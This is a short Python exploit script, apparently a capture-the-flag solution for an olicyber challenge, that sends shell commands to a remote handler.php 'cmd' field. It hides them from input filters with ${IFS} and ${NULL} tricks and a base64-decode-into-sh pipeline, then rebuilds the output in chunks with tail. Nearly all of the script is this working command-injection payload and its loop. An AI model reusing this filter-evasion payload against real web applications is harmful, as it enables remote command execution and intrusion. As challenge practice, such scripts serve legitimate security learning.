#!/usr/bin/env python3
import requests
from base64 import b64encode

SITE = "http://timp.challs.olicyber.it/handler.php"

while True:
    i = 10
    resp, t = "", [""]
    PAYLOAD = input("Enter: ").encode() # to find the flag just use the command 'cat /flag.txt'
    while True:
        f = PAYLOAD + b'|tail -c ' + str(i).encode() 
        r = requests.post(SITE, data={"cmd":"ech${NULL}o${IFS}"+ b64encode(f).decode() + "|base64${IFS}-d|sh"})
        if resp == r.text:
            break
        else:
            resp = r.text
            i += 10
            t.append(resp)
    print("".join(t[::-1]))
